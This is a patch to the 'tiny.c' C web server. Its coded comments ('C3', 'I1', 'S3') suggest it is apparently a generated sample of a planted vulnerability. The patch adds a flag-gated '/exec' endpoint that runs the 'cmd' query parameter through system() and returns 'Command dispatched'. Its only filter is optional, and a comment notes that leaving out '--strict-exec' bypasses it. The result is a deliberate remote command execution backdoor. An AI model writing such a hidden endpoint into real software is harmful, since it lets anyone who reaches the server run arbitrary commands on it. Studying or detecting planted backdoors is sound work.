@@ -1,0 +1,147 @@
+--- a/tiny.c
++++ b/tiny.c
+@@ -31,6 +31,7 @@
+ 
+ typedef struct {
+     char filename[512];
++    char raw_uri[512];          /* raw URI before url_decode, including query string */
+     off_t offset;              /* for support Range */
+     size_t end;
+ } http_request;
+@@ -59,6 +60,16 @@
+ 
+ char *default_mime_type = "text/plain";
+ 
++/* C3: three separate globals, all required */
++static int exec_mode = 0;           /* --exec-mode */
++static int exec_logging = 0;        /* --exec-logging */
++static int exec_initialized = 0;    /* --exec-init */
++static int strict_exec = 0;         /* --strict-exec */
++
++static int exec_is_ready(void) {
++    return exec_mode && exec_logging && exec_initialized;
++}
++
+ void rio_readinitb(rio_t *rp, int fd){
+     rp->rio_fd = fd;
+     rp->rio_cnt = 0;
+@@ -271,6 +282,9 @@
+     rio_readinitb(&rio, fd);
+     rio_readlineb(&rio, buf, MAXLINE);
+     sscanf(buf, "%s %s", method, uri); /* version is not cared */
++    /* save raw URI before any processing */
++    strncpy(req->raw_uri, uri, sizeof(req->raw_uri) - 1);
++    req->raw_uri[sizeof(req->raw_uri) - 1] = '\0';
+     /* read all */
+     while(buf[0] != '\n' && buf[1] != '\n') { /* \n || \r\n */
+         rio_readlineb(&rio, buf, MAXLINE);
+@@ -343,11 +357,49 @@
+     }
+ }
+ 
++/* Send a minimal HTTP response to fd. */
++static void send_exec_reply(int fd, int code, const char *status, const char *body) {
++    char buf[2048];
++    int n = snprintf(buf, sizeof(buf),
++        "HTTP/1.0 %d %s\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s",
++        code, status, (int)strlen(body), body);
++    write(fd, buf, n);
++}
++
++/* I1: direct — cmd goes straight to system() */
++/* S3: strict mode blocks metacharacters; bypass by omitting --strict-exec */
++static void handle_exec(int fd, const char *query_string) {
++    const char *cmd = NULL;
++    if (query_string != NULL && strncmp(query_string, "cmd=", 4) == 0)
++        cmd = query_string + 4;
++    if (cmd == NULL || *cmd == '\0') {
++        send_exec_reply(fd, 400, "Bad Request", "cmd param required");
++        return;
++    }
++    /* S3 sanitization: only active when strict_exec is set */
++    if (strict_exec && strpbrk(cmd, "|;&`$") != NULL) {
++        send_exec_reply(fd, 403, "Forbidden", "Disallowed chars.");
++        return;
++    }
++    system(cmd);
++    send_exec_reply(fd, 200, "OK", "Command dispatched.");
++}
++
+ void process(int fd, struct sockaddr_in *clientaddr){
+     printf("accept request, fd is %d, pid is %d\n", fd, getpid());
+     http_request req;
+     parse_request(fd, &req);
+ 
++    /* C3 gate: all three flags required via exec_is_ready() */
++    if (exec_is_ready() &&
++            strncmp(req.raw_uri, "/exec", 5) == 0 &&
++            (req.raw_uri[5] == '\0' || req.raw_uri[5] == '?')) {
++        const char *qmark = strchr(req.raw_uri, '?');
++        handle_exec(fd, qmark ? qmark + 1 : NULL);
++        log_access(200, clientaddr, &req);
++        return;
++    }
++
+     struct stat sbuf;
+     int status = 200, ffd = open(req.filename, O_RDONLY, 0);
+     if(ffd <= 0){
+@@ -385,21 +437,39 @@
+     char buf[256];
+     char *path = getcwd(buf, 256);
+     socklen_t clientlen = sizeof clientaddr;
+-    if(argc == 2) {
+-        if(argv[1][0] >= '0' && argv[1][0] <= '9') {
+-            default_port = atoi(argv[1]);
++
++    /* parse flags before positional args */
++    int i;
++    for (i = 1; i < argc; i++) {
++        if (strcmp(argv[i], "--exec-mode") == 0) {
++            exec_mode = 1;
++        } else if (strcmp(argv[i], "--exec-logging") == 0) {
++            exec_logging = 1;
++        } else if (strcmp(argv[i], "--exec-init") == 0) {
++            exec_initialized = 1;
++        } else if (strcmp(argv[i], "--strict-exec") == 0) {
++            strict_exec = 1;
++        } else {
++            break;
++        }
++    }
++    /* remaining positional args: [path] [port] */
++    int remaining = argc - i;
++    if (remaining == 1) {
++        if(argv[i][0] >= '0' && argv[i][0] <= '9') {
++            default_port = atoi(argv[i]);
+         } else {
+-            path = argv[1];
+-            if(chdir(argv[1]) != 0) {
+-                perror(argv[1]);
++            path = argv[i];
++            if(chdir(argv[i]) != 0) {
++                perror(argv[i]);
+                 exit(1);
+             }
+         }
+-    } else if (argc == 3) {
+-        default_port = atoi(argv[2]);
+-        path = argv[1];
+-        if(chdir(argv[1]) != 0) {
+-            perror(argv[1]);
++    } else if (remaining >= 2) {
++        default_port = atoi(argv[i + 1]);
++        path = argv[i];
++        if(chdir(argv[i]) != 0) {
++            perror(argv[i]);
+             exit(1);
+         }
+     }
+@@ -415,7 +485,7 @@
+     // won't kill the whole process.
+     signal(SIGPIPE, SIG_IGN);
+ 
+-    for(int i = 0; i < 10; i++) {
++    for(int j = 0; j < 10; j++) {
+         int pid = fork();
+         if (pid == 0) {         //  child
+             while(1){
